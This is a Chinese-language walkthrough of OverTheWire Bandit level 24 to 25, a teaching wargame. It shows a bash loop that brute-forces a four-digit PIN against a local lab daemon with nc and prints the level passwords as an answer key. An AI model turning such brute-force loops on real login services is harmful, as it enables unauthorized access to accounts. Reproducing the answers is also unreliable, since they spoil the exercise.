# Bandit Level 24 → 25 — Brute Force PIN

> 10000 種組合，靠腦子試不完——這關教你用 shell 自動產生所有可能，一次全部丟進去。

---

## 題目說明

官方原文：

> A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing. You do not need to create new connections each time.

每次送出：`bandit24密碼 空格 4位數PIN`，PIN 從 0000 到 9999，暴力破解。

---

## 解題步驟

建立工作目錄：

```bash
mkdir /tmp/mywork25 && cd /tmp/mywork25
```

寫 script 產生所有 10000 行組合：

```bash
nano gen.sh
```

```bash
#!/bin/bash
for i in $(seq -w 0000 9999); do
    echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"
done
```

```bash
chmod +x gen.sh
```

一次 pipe 進 nc，過濾掉錯誤行：

```bash
./gen.sh | nc localhost 30002 | grep -v "Wrong"
```

輸出：

```
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

---

## 密碼

<details>
<summary>展開（先自己試過再看）</summary>

```
iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

</details>

---

## 這關學到什麼

- `seq -w 0000 9999`：產生帶前導零的序列
- 單一連線一次送 10000 行，比開 10000 次連線快很多
- `grep -v "Wrong"`：反向過濾，只留正確答案

---

<div align="center">

**◀ [Level 23 → 24：cron 腳本](../level23/)** · [🏠 回 Bandit 索引](../README.md) · **[Level 25 → 26：more / vim 逃逸 ▶](../level25/)**

</div>
